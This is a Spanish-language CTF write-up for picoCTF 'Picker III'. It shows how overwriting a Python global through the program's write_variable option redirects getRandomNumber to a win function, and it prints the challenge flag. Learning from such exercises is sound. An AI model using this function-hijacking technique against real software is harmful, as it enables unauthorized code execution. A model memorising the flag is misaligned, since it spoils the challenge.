## Picker III
## Descripcion

Can you figure out how this program works to get the flag?Connect to the program with netcat:`$ nc saturn.picoctf.net 60874`The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/525/picker-III.py).
## Solucion

- Descargamos el código fuente que nos dan con el reto y lo analizamos. Hay una tabla con el nombre de las funciones que se pueden ejecutar `func_table`. La idea es buscar la forma de agregar a esa tabla la función `win()` para llamarla de manera indirecta.
- Nos conectamos al reto para analizar la funcionalidad.
```
nc saturn.picoctf.net 49336
==> help

This program fixes vulnerabilities in its predecessor by limiting what
functions can be called to a table of predefined functions. This still puts
the user in charge, but prevents them from calling undesirable subroutines.

* Enter 'quit' to quit the program.
* Enter 'help' for this text.
* Enter 'reset' to reset the table.
* Enter '1' to execute the first function in the table.
* Enter '2' to execute the second function in the table.
* Enter '3' to execute the third function in the table.
* Enter '4' to execute the fourth function in the table.

Here's the current table:
  
1: print_table
2: read_variable
3: write_variable
4: getRandomNumber
```
- Leemos el valor de las variables con la opción 2, podemos leer el contenido de las variables, si ponemos el nombre de una función, leemos su dirección en memoria
```
==> 2
Please enter variable name to read: func_table    
print_table                     read_variable                   write_variable                  getRandomNumber                 
==> 2
Please enter variable name to read: getRandomNumber
<function getRandomNumber at 0x74f9c6703d30>
```
- Hay otra función que permite modificar el valor de una variable, pero hay una protección si la tabla se corrompe (debe ser 128 caracteres) `check_table()`
- La solución : Modificar la dirección de memoria de alguna función en la tabla para que apunte ala función win
```
==> 3
Please enter variable name to write: getRandomNumber
Please enter new value of variable: win
==> 4
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x32 0x32 0x36 0x64 0x64 0x32 0x38 0x35 0x7d 
```

**`picoCTF{7h15_15_wh47_w3_g37_w17h_u53r5_1n_ch4rg3_a186f9ac}`**
## Notas

- **Funciones como "Ciudadanos de Primera Clase" (First-Class Objects):** La clave de este exploit radica en el diseño del lenguaje Python. En Python, las funciones no son estáticas; son objetos en memoria exactamente igual que un número entero, una lista o una cadena de texto. Esto significa que el nombre de una función (como `getRandomNumber`) es solo una variable que "apunta" al bloque de código de esa función.
    
- **Secuestro de Función (Function Hijacking / Hooking):** Al usar la opción `write_variable`, el programa te permitió cambiar hacia dónde apuntaba la variable `getRandomNumber`. En lugar de apuntar a su código original, la hiciste apuntar al objeto en memoria de la función `win`. Cuando el programa intentó ejecutar `getRandomNumber()`, en realidad ejecutó `win()`.
    
- **Exposición del Estado Interno:** La vulnerabilidad crítica de esta aplicación es que permite a un usuario externo modificar el entorno global (el estado interno) del script sin ningún tipo de lista blanca (allowlist) o restricción de permisos.
    
- **Inspección de Memoria:** Cuando usaste `read_variable` y escribiste `getRandomNumber`, el programa te devolvió `<function getRandomNumber at 0x7eb875435d30>`. Esto fue una pista fundamental: te confirmó que estabas interactuando directamente con las referencias de los objetos en la memoria RAM del servidor.
## Referencias
**Sobrescritura de Variables (Variable Overwriting):** En el mundo del hacking web y de software, busca conceptos relacionados como _Parameter Pollution_ o _Insecure Direct Object References (IDOR)_, donde la falta de validación permite a un usuario modificar datos a los que no debería tener acceso.